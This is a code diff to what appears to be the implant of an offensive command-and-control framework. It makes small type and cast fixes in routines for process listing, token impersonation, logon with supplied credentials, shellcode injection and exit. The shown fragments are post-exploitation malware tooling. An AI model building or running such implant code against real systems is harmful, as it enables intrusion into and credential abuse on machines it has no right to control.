@@ -11,6 +11,7 @@
 #include <core/Dotnet.h>
 #include <core/Kerberos.h>
 #include <core/CoffeeLdr.h>
+#include <core/Runtime.h>
 #include <inject/Inject.h>
 
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
@@ -615,7 +616,7 @@ VOID CommandProcList(
             }
 
             /* Now we append the collected process data to the process list  */
-            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+            PackageAddBytes( Package, (PBYTE)SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
             PackageAddInt32( Package, x86 );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
@@ -697,7 +698,7 @@ VOID CommandFS( PPARSER Parser )
             LPWSTR           Ends         = NULL;
             PDIR_OR_FILE     DirOrFile    = NULL;
             PDIR_OR_FILE     TmpDirOrFile = NULL;
-            UINT32           PathSize     = NULL;
+            UINT32           PathSize     = 0;
 
             FileExplorer = ParserGetBool( Parser );
             TargetFolder = ParserGetWString( Parser, NULL );
@@ -1272,9 +1273,9 @@ VOID CommandInjectShellcode(
     DWORD     Method  = 0;
     BOOL      x64     = FALSE;
     PVOID     Payload = NULL;
-    DWORD     Size    = 0;
+    UINT32    Size    = 0;
     PVOID     Argv    = NULL;
-    DWORD     Argc    = 0;
+    UINT32    Argc    = 0;
     DWORD     Pid     = 0;
     LPWSTR    Spawn   = NULL;
     PROC_INFO PcInfo  = { 0 };
@@ -1390,7 +1391,11 @@ VOID CommandToken( PPARSER Parser )
             if ( TokenData )
             {
                 PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
-                PackageAddString( Package, TokenData->DomainUser );
+                {
+                    CHAR AnsiBuffer[512] = {0};
+                    WCharStringToCharString( AnsiBuffer, TokenData->DomainUser, sizeof(AnsiBuffer) - 1 );
+                    PackageAddString( Package, AnsiBuffer );
+                }
             }
             else
             {
@@ -1538,7 +1543,7 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             DWORD  LogonType      = ParserGetInt32( Parser );
-            CHAR   Deli[ 2 ]      = { '\\', 0 };
+            WCHAR  Deli[ 2 ]      = { L'\\', 0 };
             HANDLE hToken         = NULL;
             PWCHAR UserDomain     = NULL;
             LPWSTR BufferUser     = NULL;
@@ -3469,7 +3474,7 @@ VOID CommandExit( PPARSER Parser )
      */
 
     ImageBase = Instance->Session.ModuleBase;
-    ImageSize = NULL;
+    ImageSize = 0;
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.RtlCaptureContext( &RopExit );
